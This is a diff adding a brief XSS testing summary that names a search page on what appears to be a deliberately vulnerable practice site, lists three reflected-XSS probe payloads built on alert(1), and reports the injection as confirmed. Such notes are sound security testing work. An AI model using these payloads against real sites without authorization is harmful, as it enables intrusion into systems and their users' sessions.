@@ -1,0 +1,12 @@
+# XSS Testing Summary
+
+## Target
+http://testphp.vulnweb.com/search.php?test=query
+
+## Payloads Tested
+- <script>alert(1)</script>
+- <img src=x onerror=alert(1)>
+- "><svg/onload=alert(1)>
+
+## Result
+Reflected XSS was confirmed when payloads were returned in the response without sanitization.
